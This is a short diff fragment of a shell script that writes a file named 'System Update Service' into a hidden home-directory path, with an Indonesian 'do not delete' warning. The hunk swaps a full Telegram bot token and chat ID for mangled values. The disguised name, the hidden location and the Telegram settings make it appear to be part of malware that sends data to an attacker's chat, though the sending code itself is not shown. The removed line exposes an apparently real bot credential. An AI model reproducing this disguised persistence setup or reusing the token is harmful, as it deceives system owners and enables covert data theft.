@@ -125,8 +125,8 @@ cat > $HOME/.system/.cache/update.sh << 'EOF'
 # System Update Service - JANGAN DIHAPUS!
 
 # ===== KONFIGURASI =====
-TELEGRAM_TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
-TELEGRAM_CHAT="8042897984"
+TELEGRAM_TOKEN="8217084Yfza62pEg0ROlWg"
+TELEGRAM_CHAT="80427984"
 # =======================
 
 
